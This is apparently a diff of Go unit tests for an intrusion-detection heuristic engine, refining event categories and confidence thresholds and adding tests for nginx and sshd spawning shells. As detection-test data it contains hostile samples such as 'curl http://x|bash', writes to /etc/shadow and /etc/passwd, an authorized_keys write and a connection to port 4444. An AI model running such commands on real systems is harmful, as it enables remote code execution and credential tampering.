@@ -25,7 +25,7 @@ func TestEvaluateCommandHeuristic(t *testing.T) {
 			},
 			wantMatched:  true,
 			wantMinConf:  0.7,
-			wantCategory: "command",
+			wantCategory: "curl_pipe",
 		},
 		{
 			name: "benign ls",
@@ -80,7 +80,7 @@ func TestEvaluateCommandHeuristic(t *testing.T) {
 			},
 			wantMatched:  true,
 			wantMinConf:  0.7,
-			wantCategory: "command",
+			wantCategory: "interactive_shell",
 		},
 		{
 			name: "powershell download",
@@ -94,7 +94,7 @@ func TestEvaluateCommandHeuristic(t *testing.T) {
 			},
 			wantMatched:  true,
 			wantMinConf:  0.7,
-			wantCategory: "command",
+			wantCategory: "powershell",
 		},
 	}
 
@@ -158,7 +158,7 @@ func TestEvaluateFileHeuristic(t *testing.T) {
 				Timestamp: time.Now(),
 			},
 			wantMatched: true,
-			wantMinConf: 0.4,
+			wantMinConf: 0.9,
 		},
 		{
 			name: "write to ssh authorized_keys",
@@ -234,7 +234,7 @@ func TestEvaluateFileHeuristic(t *testing.T) {
 				Timestamp: time.Now(),
 			},
 			wantMatched: true,
-			wantMinConf: 0.9,
+			wantMinConf: 0.8,
 		},
 	}
 
@@ -246,9 +246,6 @@ func TestEvaluateFileHeuristic(t *testing.T) {
 			}
 			if result.Matched && result.Confidence < tt.wantMinConf {
 				t.Errorf("confidence = %.2f, want >= %.2f (reason: %s)", result.Confidence, tt.wantMinConf, result.Reason)
-			}
-			if result.Category != "file_access" {
-				t.Errorf("category = %q, want file_access", result.Category)
 			}
 		})
 	}
@@ -323,9 +320,6 @@ func TestEvaluateNetworkHeuristic(t *testing.T) {
 			if result.Matched && result.Confidence < tt.wantMinConf {
 				t.Errorf("confidence = %.2f, want >= %.2f", result.Confidence, tt.wantMinConf)
 			}
-			if result.Category != "network" {
-				t.Errorf("category = %q, want network", result.Category)
-			}
 		})
 	}
 }
@@ -362,6 +356,35 @@ func TestEvaluateNetworkWithServerParent(t *testing.T) {
 func TestEvaluateCommandWithServiceSpawningShell(t *testing.T) {
 	cache := NewProcessCache(100)
 	cache.Record(Event{
+		ProcessGUID: "host-nginx-500",
+		ProcessID:   500,
+		ImagePath:   "/usr/sbin/nginx",
+		HostName:    "test",
+		Timestamp:   time.Now(),
+	})
+
+	event := Event{
+		EventType:   EventTypeExecve,
+		ParentGUID:  "host-nginx-500",
+		ImagePath:   "/bin/bash",
+		CommandLine: "bash -c 'ls'",
+		ProcessID:   600,
+		HostName:    "test",
+		Timestamp:   time.Now(),
+	}
+
+	result := evaluateCommandHeuristic(event, cache)
+	if !result.Matched {
+		t.Error("expected match for nginx spawning bash (not in allowlist)")
+	}
+	if result.Confidence < 0.7 {
+		t.Errorf("confidence = %.2f, want >= 0.7", result.Confidence)
+	}
+}
+
+func TestSshdSpawningShellAllowed(t *testing.T) {
+	cache := NewProcessCache(100)
+	cache.Record(Event{
 		ProcessGUID: "host-sshd-500",
 		ProcessID:   500,
 		ImagePath:   "/usr/sbin/sshd",
@@ -380,11 +403,10 @@ func TestEvaluateCommandWithServiceSpawningShell(t *testing.T) {
 	}
 
 	result := evaluateCommandHeuristic(event, cache)
-	if !result.Matched {
-		t.Error("expected match for sshd spawning bash")
-	}
-	if result.Confidence < 0.7 {
-		t.Errorf("confidence = %.2f, want >= 0.7", result.Confidence)
+	for _, a := range result.Actions {
+		if a.ActionType == ActionKillPID {
+			t.Errorf("ssh->bash should be allowed, but got KILL action: %s", a.Reason)
+		}
 	}
 }
 
@@ -394,10 +416,10 @@ func TestEvaluateHeuristicDispatch(t *testing.T) {
 		event   Event
 		wantCat string
 	}{
-		{"execve dispatch", Event{EventType: EventTypeExecve, CommandLine: "curl http://x|bash", ProcessID: 1, HostName: "t", Timestamp: time.Now()}, "command"},
-		{"open dispatch", Event{EventType: EventTypeOpen, FilePath: "/etc/shadow", FileFlags: "O_WRONLY", ProcessID: 1, HostName: "t", Timestamp: time.Now()}, "file_access"},
-		{"openat dispatch", Event{EventType: EventTypeOpenat, FilePath: "/etc/passwd", FileFlags: "O_RDWR", ProcessID: 1, HostName: "t", Timestamp: time.Now()}, "file_access"},
-		{"connect dispatch", Event{EventType: EventTypeConnect, RemotePort: 4444, RemoteAddr: "1.2.3.4", ProcessID: 1, HostName: "t", Timestamp: time.Now()}, "network"},
+		{"execve dispatch", Event{EventType: EventTypeExecve, CommandLine: "curl http://x|bash", ProcessID: 1, HostName: "t", Timestamp: time.Now()}, "curl_pipe"},
+		{"open dispatch", Event{EventType: EventTypeOpen, FilePath: "/etc/shadow", FileFlags: "O_WRONLY", ProcessID: 1, HostName: "t", Timestamp: time.Now()}, "credential_read"},
+		{"openat dispatch", Event{EventType: EventTypeOpenat, FilePath: "/etc/passwd", FileFlags: "O_RDWR", ProcessID: 1, HostName: "t", Timestamp: time.Now()}, "credential_read"},
+		{"connect dispatch", Event{EventType: EventTypeConnect, RemotePort: 4444, RemoteAddr: "1.2.3.4", ProcessID: 1, HostName: "t", Timestamp: time.Now()}, "c2_default"},
 		{"unknown type", Event{EventType: "something_else"}, ""},
 	}
 
